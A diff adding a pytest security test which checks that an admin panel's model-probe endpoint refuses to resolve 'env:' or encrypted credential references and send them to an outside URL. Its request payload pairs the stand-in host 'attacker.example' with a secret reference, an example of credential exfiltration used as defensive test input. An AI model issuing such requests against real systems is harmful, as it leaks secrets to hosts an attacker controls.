@@ -390,3 +390,42 @@ def test_a_masked_token_falls_back_to_the_saved_value(client: TestClient, tmp_pa
     assert token == ""
     assert problem
     assert "OB_TOKEN" in problem
+
+
+class _NoNetwork:
+    """Fails loudly if the endpoint dials before refusing a credential reference."""
+
+    async def __aenter__(self):
+        raise AssertionError("the probe dialled a host before refusing the reference")
+
+    async def __aexit__(self, *exc):
+        return False
+
+
+@pytest.mark.parametrize(
+    "reference",
+    ["env:DEEPSEEK_API_KEY", "enc:v1:gAAAAABnot-a-real-ciphertext"],
+)
+def test_model_probe_refuses_to_resolve_a_credential_reference(
+    client: TestClient, monkeypatch, reference: str
+) -> None:
+    """The panel must never turn a reference into a secret sent to a chosen URL.
+
+    ``resolve_secret`` handles both prefixes — ``env:`` reads the host's environment,
+    ``enc:v1:`` decrypts. Either would let an ADMIN export a credential the panel never
+    shows them, to a host they control. Literal keys are still allowed: the operator
+    typed it, so sending it is their decision.
+    """
+    monkeypatch.setattr(config_probe, "outbound_client", lambda: _NoNetwork())
+
+    response = client.post(
+        "/api/config/providers/models",
+        json={"base_url": "https://attacker.example/v1", "api_key": reference},
+    )
+
+    assert response.status_code == 200, response.text
+    body = response.json()
+    assert body["ok"] is False
+    assert body["models"] == []
+    assert "字面" in body["error"]
+
